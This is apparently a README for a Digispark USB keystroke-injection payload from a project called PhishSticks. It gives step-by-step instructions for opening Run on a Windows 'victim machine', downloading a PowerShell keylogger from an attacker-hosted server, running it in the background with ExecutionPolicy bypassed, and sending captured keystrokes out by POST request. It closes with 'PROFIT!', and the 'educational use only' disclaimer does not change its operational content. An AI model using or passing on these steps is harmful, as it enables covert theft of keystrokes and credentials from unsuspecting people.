**EDUCATIONAL USE ONLY, USE AT YOUR OWN RISK!**
# Digispark - Keylogger
For more details, see our [documentations](/documentation/conops_keylogger.md).

Opens up Run in Windows.   
Using keystroke injections:   
- Downloads the keylogger script, from user defined location, to `$env:Temp\`.   
- Executes the script, bypassing the ExecutionPolicy, in the backgroud.
- Script logs the keypresses to a file and after some time, specified in the script, it sends the content of the file to server as POST request

Check out more detailed usage of the [Keylogger in our project.](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/keylogger)    
**NOTE:**   
Currently we are using the [one with the POST request](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_post.ps1)


## How to use: 

*Designed, using Finnish keyboard in victim machine.*     
- Check [DigiKeyboardFi](https://github.com/therealhalonen/DigiKeyboardFi) for support it.    
- Download the .ino, or copy the code.    
- Open the file or paste the content to/in Arduino IDE.
- Grab the [keylogger script](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_post.ps1)3
- Edit the script, [with instructions](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/keylogger/keylog_ps#how-to-use-1)
- Host/serve the script from your preferred location
	- For example straight from attack device with simple python `python3 -m http.server PORT`
	- OR using our [simple Flask app](scripts/webhook), that is designed to be used in our testings, with the keylogger.
- Define:
	-  `DownloadFile('FULL_ADDRESS_WITH_FILENAME'`, the one you are serving the payload from.    
	- Path, where to download and what to execute (both must be the same):
		- `$env:Temp\\FILE_NAME_OF_YOUR_CHOICE.ps1`   
- Upload to Digispark
- Plug in to victim machine
- **PROFIT!**